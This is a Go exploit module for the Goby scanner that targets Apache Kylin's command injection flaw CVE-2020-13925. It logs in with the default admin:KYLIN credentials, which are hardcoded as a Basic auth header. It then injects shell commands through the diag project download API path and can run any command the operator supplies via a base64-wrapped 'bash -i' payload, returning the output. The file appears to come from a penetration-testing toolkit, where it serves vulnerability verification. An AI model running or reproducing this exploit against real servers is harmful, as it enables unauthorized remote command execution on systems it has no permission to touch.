package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache Kylin Post-Auth Command Injection (CVE-2020-13925)",
    "Description": "Similar to CVE-2020-1956, Kylin has one more restful API which concatenates the API inputs into OS commands and then executes them on the server; while the reported API misses necessary input validation, which causes the hackers to have the possibility to execute OS command remotely. Users of all previous versions after 2.3 should upgrade to 3.1.0.",
    "Product": "Apache Kylin",
    "Homepage": "https://kylin.apache.org/",
    "DisclosureDate": "2020-07-14",
    "Author": "ovi3",
    "FofaQuery": "app=\"APACHE-kylin\"",
    "Level": "1",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13925",
        "https://www.freebuf.com/vuls/243541.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmdEncode",
            "type": "createSelect",
            "value": "base64,none",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": null,
    "CVEIDs": [
        "CVE-2020-13925"
    ],
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10191"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/kylin/api/user/authentication")
			cfg.VerifyTls = false
			cfg.Header.Store("Authorization", "Basic YWRtaW46S1lMSU4=") // 采用默认账户密码：  admin:KYLIN
			cfg.Header.Store("Cookie", "project=null")

			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && regexp.MustCompile(`^{"userDetails":{"username":".*?","password"`).MatchString(resp.RawBody) {
					m := regexp.MustCompile(`JSESSIONID=(.*?);`).FindStringSubmatch(resp.Cookie)
					if m == nil {
						return false
					}
					JSESSIONID := m[1]

					randStr := goutils.RandomHexString(10)
					randStrBase64 := base64.StdEncoding.EncodeToString([]byte(randStr))
					cmdToInject := fmt.Sprintf("||`echo %s|base64`||", randStr)
					cmdToInject = url.PathEscape(cmdToInject)
					cfg2 := httpclient.NewGetRequestConfig(fmt.Sprintf(`/kylin/api/diag/project/%s/download`, cmdToInject))
					cfg2.Header.Store("Cookie", "project=null;JSESSIONID="+JSESSIONID)
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						if strings.Contains(resp2.RawBody, randStrBase64[:len(randStrBase64)-4]) { // echo 命令后面有换行符，导致base64结果末尾不一致，故截断末尾几个字符
							return true
						}
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/kylin/api/user/authentication")
			cfg.VerifyTls = false
			cfg.Header.Store("Authorization", "Basic YWRtaW46S1lMSU4=") // 采用默认账户密码：  admin:KYLIN
			cfg.Header.Store("Cookie", "project=null")

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && regexp.MustCompile(`^{"userDetails":{"username":".*?","password"`).MatchString(resp.RawBody) {
					m := regexp.MustCompile(`JSESSIONID=(.*?);`).FindStringSubmatch(resp.Cookie)
					if m == nil {
						return expResult
					}
					JSESSIONID := m[1]

					cmdToInject := ss.Params["cmd"].(string)
					cmdEncode := ss.Params["cmdEncode"].(string)
					if cmdEncode == "base64" {
						cmdToInject = fmt.Sprintf("||`echo %s|base64 -d|bash -i|base64 -w 0`||", base64.StdEncoding.EncodeToString([]byte(cmdToInject)))
					}

					cmdToInject = url.PathEscape(cmdToInject)
					cfg2 := httpclient.NewGetRequestConfig(fmt.Sprintf(`/kylin/api/diag/project/%s/download`, cmdToInject))
					cfg2.Header.Store("Cookie", "project=null;JSESSIONID="+JSESSIONID)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						expResult.Success = true
						if cmdEncode == "base64" {
							m := regexp.MustCompile(`/bin/bash: (.*?): command not found`).FindStringSubmatch(resp2.RawBody)
							if m == nil {
								expResult.Output = resp2.RawBody
							} else {
								if d, err := base64.StdEncoding.DecodeString(m[1]); err == nil {
									expResult.Output = string(d)
								} else {
									expResult.Output = m[1]
								}

							}
						} else {
							expResult.Output = resp2.RawBody
						}

					}
				}
			}

			return expResult
		},
	))
}
